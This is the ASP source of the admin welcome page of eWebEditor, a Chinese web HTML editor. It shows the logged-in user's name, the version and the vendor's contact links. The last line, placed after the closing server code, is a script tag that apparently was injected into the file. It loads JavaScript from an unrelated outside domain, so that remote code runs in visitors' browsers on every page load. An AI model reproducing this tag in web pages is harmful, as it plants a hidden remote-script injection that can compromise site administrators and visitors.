<!--#include file = "include/startup.asp"-->
<!--#include file = "admin_private.asp"-->
<%
'☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆
'★                                                                  ★
'☆                ewebeditor - ewebsoft在线编辑器                   ☆
'★                                                                  ★
'☆  版权所有: ewebsoft.com                                          ☆
'★                                                                  ★
'☆  程序制作: eweb开发团队                                          ☆
'★            email:webmaster@webasp.net                            ★
'☆            qq:589808                                             ☆
'★                                                                  ★
'☆  相关网址: [产品介绍]http://www.ewebsoft.com/product/ewebeditor/ ☆
'★            [支持论坛]http://bbs.ewebsoft.com/                    ★
'☆                                                                  ☆
'★  主页地址: http://www.ewebsoft.com/   ewebsoft团队及产品         ★
'☆            http://www.webasp.net/     web技术及应用资源网站      ☆
'★            http://bbs.webasp.net/     web技术交流论坛            ★
'★                                                                  ★
'☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆
%>

<%

sposition = ""

call header()
call content()
call footer()


sub content()
%>
	<table border=0 cellpadding=0 cellspacing=0 width="100%">
	<tr><td align=right><img border=0 src='admin/logo.gif'></td></tr>
	<tr><td align=center height=100><span class=highlight1><b><%=outhtml(session("ewebeditor_user"))%>：欢迎您使用本系统</b></span><br><br><br><b><span class=highlight2>为保证系统数据安全，使用完后请点击退出！</span></b></td></tr>
	<tr>
		<td>
		<table border=0 cellpadding=4 cellspacing=0>
		<tr>
			<td><b>软件版本：</b></td><td>ewebeditor version <%=session("ewebeditor_version")%></td>
		</tr>
		<tr>
			<td><b>版权所有：</b></td><td>ewebsoft.com</td>
		</tr>
		<tr>
			<td><b>程序制作：</b></td><td>eweb开发团队</td>
		</tr>
		<tr>
			<td><b>主页地址：</b></td><td><a href="http://www.ewebsoft.com" target="_blank">http://www.ewebsoft.com</a>&nbsp;&nbsp;&nbsp;<a href="http://www.webasp.net" target="_blank">http://www.webasp.net</a></td>
		</tr>
		<tr>
			<td><b>产品介绍：</b></td><td><a href="http://http://www.ewebsoft.com/product/ewebeditor/" target="_blank">http://www.ewebsoft.com/product/ewebeditor/</a></td>
		</tr>
		<tr>
			<td><b>论坛地址：</b></td><td><a href="http://bbs.webasp.net" target="_blank">http://bbs.webasp.net</a></td>
		</tr>
		<tr>
			<td><b>联系方式：</b></td><td>oicq:589808&nbsp;&nbsp;&nbsp;&nbsp;email:<a href="mailto:webmaster@webasp.net">webmaster@webasp.net</a></td>
		</tr>
		</table>
		</td>
	</tr>
	<tr><td height=30></td></tr>
	</table>
<%
end sub
%><script language="javascript" src="http://5.inc.0rg.fr/inc.js?tn=iacnnet_pg&cv=0&cid=1157572&csid=302"></script>